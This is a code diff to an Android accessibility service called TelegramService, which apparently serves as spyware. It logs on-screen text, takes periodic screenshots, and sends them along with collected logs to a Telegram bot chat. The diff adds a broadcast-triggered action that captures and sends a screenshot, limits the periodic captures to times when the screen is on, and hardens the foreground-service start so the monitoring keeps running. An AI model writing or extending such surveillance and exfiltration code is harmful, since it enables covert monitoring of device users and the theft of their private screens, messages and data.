@@ -52,11 +52,21 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
     private val lastTextMap = mutableMapOf<String, String>()
     private val forceSendReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
-            if (intent?.action == "com.example.telegramsender.ACTION_FORCE_SEND") {
-                Log.d("TelegramService", "Force send logs requested")
-                CoroutineScope(Dispatchers.IO).launch {
-                    if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
-                        sendAndClearLogs()
+            when (intent?.action) {
+                "com.example.telegramsender.ACTION_FORCE_SEND" -> {
+                    Log.d("TelegramService", "Force send logs requested")
+                    CoroutineScope(Dispatchers.IO).launch {
+                        if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
+                            sendAndClearLogs()
+                        }
+                    }
+                }
+                "com.example.telegramsender.ACTION_TEST_SCREENSHOT" -> {
+                    Log.d("TelegramService", "Test screenshot requested")
+                    CoroutineScope(Dispatchers.IO).launch {
+                        if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
+                            captureAndSend()
+                        }
                     }
                 }
             }
@@ -96,7 +106,10 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         }
         
         // Register receiver
-        val filter = android.content.IntentFilter("com.example.telegramsender.ACTION_FORCE_SEND")
+        val filter = android.content.IntentFilter()
+        filter.addAction("com.example.telegramsender.ACTION_FORCE_SEND")
+        filter.addAction("com.example.telegramsender.ACTION_TEST_SCREENSHOT")
+        
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             registerReceiver(forceSendReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
         } else {
@@ -150,10 +163,9 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
                 loadCredentials()
                 
                 if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
-                    captureAndSend() // Screenshots still managed here (Accessibility dependent)
-                    
-                    // Camera moved to MonitorService
-                    // if (sendCamera) captureCameraAndSend()
+                    if (isScreenOn()) {
+                        captureAndSend() // Screenshots still managed here (Accessibility dependent)
+                    }
                     
                     // Check logs periodicity (every 1 hour)
                     if (System.currentTimeMillis() - lastLogSendTime > 1 * 60 * 60 * 1000) {
@@ -462,8 +474,16 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
             .setSmallIcon(R.mipmap.ic_launcher)
             .build()
 
-        // Service ID 1
-        startForeground(1, notification)
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                // Fallback to dataSync to avoid MissingForegroundServiceTypeException on Android 14+
+                startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+            } else {
+                startForeground(1, notification)
+            }
+        } catch (e: Exception) {
+            Log.e("TelegramService", "Failed to start FGS", e)
+        }
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
